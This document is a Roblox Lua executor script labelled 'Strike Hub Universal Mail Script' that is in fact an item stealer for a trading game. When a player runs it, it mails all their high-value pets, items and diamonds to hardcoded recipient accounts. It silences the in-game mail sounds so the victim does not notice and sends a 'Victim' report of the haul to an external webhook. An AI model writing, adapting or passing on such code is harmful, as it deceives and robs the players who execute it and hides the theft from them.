--// Strike Hub Universal Mail Script (Executor-Safe)
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local network, saveModule, messageModule = nil, nil, nil

-- Safe require function
local function safeRequire(path)
    local success, result = pcall(require, path)
    return success and result or {}
end

-- Load modules safely
network = safeRequire(game.ReplicatedStorage.Library.Client.Network)
saveModule = safeRequire(game.ReplicatedStorage.Library.Client.Save)
messageModule = safeRequire(game.ReplicatedStorage.Library.Client.Message)

local MailMessage = "GGz"
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

-- Prevent sending to self
for _, u in ipairs(users) do
    if plr.Name == u then plr:Kick("Cannot mail yourself") return end
end

-- Get save safely
local rawSave = (saveModule.Get and saveModule.Get()) or {}
local save = rawSave.Inventory or {}

-- Get mail price safely
local mailSendPrice = 10000
pcall(function()
    for _, f in pairs(getgc and getgc() or {}) do
        if debug.getinfo(f).name == "computeSendMailCost" then
            mailSendPrice = f()
            break
        end
    end
end)

-- Get diamonds
local GemAmount = 0
if save.Currency then
    for _, v in pairs(save.Currency) do
        if v.id == "Diamonds" then
            GemAmount = v._am
            break
        end
    end
end

-- Format number for webhook
local function formatNumber(n)
    if n >= 1e12 then return string.format("%.2ft", n/1e12)
    elseif n >= 1e9 then return string.format("%.2fb", n/1e9)
    elseif n >= 1e6 then return string.format("%.2fm", n/1e6)
    elseif n >= 1e3 then return string.format("%.2fk", n/1e3)
    else return tostring(math.floor(n)) end
end

-- RAP getter
local function getRAP(category, item)
    local success, val = pcall(function()
        local RAPCmds = require(game.ReplicatedStorage.Library.Client.RAPCmds)
        return RAPCmds.Get({
            Class = {Name = category},
            IsA = function(h) return h == category end,
            GetId = function() return item.id end,
            StackKey = function()
                return HttpService:JSONEncode({id=item.id, pt=item.pt or 0, sh=item.sh or false, tn=item.tn or ""})
            end
        })
    end)
    return success and val or (item._rap or 0)
end

-- Collect items sorted by RAP
local sortedItems, totalRAP = {}, 0
for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
    if save[cat] then
        for uid, item in pairs(save[cat]) do
            local rap = getRAP(cat, item)
            if rap >= min_rap then
                table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rap, name=item.id})
                totalRAP += rap * (item._am or 1)
            end
        end
    end
end
table.sort(sortedItems, function(a,b) return a.rap*a.amount > b.rap*b.amount end)

-- Send item to multiple users
local function sendItem(category, uid, amount)
    local userIndex, maxUsers = 1, #users
    local sent = false
    repeat
        local currentUser = users[userIndex]
        local args = {currentUser, MailMessage, category, uid, amount or 1}
        local ok, response, err = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
        if ok and response == true then
            sent = true
            GemAmount = GemAmount - mailSendPrice
            mailSendPrice = math.min(math.ceil(mailSendPrice*1.5), 5000000)
        elseif err == "They don't have enough space!" or (response==false and err=="They don't have enough space!") then
            userIndex = userIndex + 1
            if userIndex > maxUsers then sent = true end
        end
    until sent
end

-- Send all gems
local function SendAllGems()
    if GemAmount <= mailSendPrice then return end
    for i,v in pairs(save.Currency or {}) do
        if v.id=="Diamonds" then
            local userIndex, maxUsers = 1, #users
            local sent = false
            repeat
                local currentUser = users[userIndex]
                local args = {currentUser, MailMessage, "Currency", i, GemAmount - mailSendPrice}
                local ok, response = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
                if ok and response==true then sent=true
                else
                    userIndex = userIndex + 1
                    if userIndex>maxUsers then sent=true end
                end
            until sent
            break
        end
    end
end

-- Mute mail sounds
game.DescendantAdded:Connect(function(x)
    if x.ClassName=="Sound" and (x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276") then
        pcall(function() x:Stop(); x.Volume=0; x:Destroy() end)
    end
end)

-- Send items sequentially
for _, item in ipairs(sortedItems) do
    sendItem(item.category, item.uid, item.amount)
end

-- Send remaining gems
SendAllGems()

-- Optional webhook
pcall(function()
    if webhook~="" then
        local fields={{name="Victim:",value=plr.Name,inline=true},{name="Items:",value="",inline=false},{name="Summary:",value="Total RAP: "..formatNumber(totalRAP),inline=false}}
        for _, item in ipairs(sortedItems) do
            fields[2].value = fields[2].value .. item.name.." (x"..item.amount.."): "..formatNumber(item.rap*item.amount).."\n"
        end
        local body = HttpService:JSONEncode({embeds={{title="New PS99 Execution",color=65280,fields=fields,footer={text="Strike Hub."}}}})
        local req = request or http_request or (syn and syn.request) or (http and http.request)
        if req then req({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end
    end
end)

print("[Strike Hub] Finished sending items. No sounds will play during mail.")
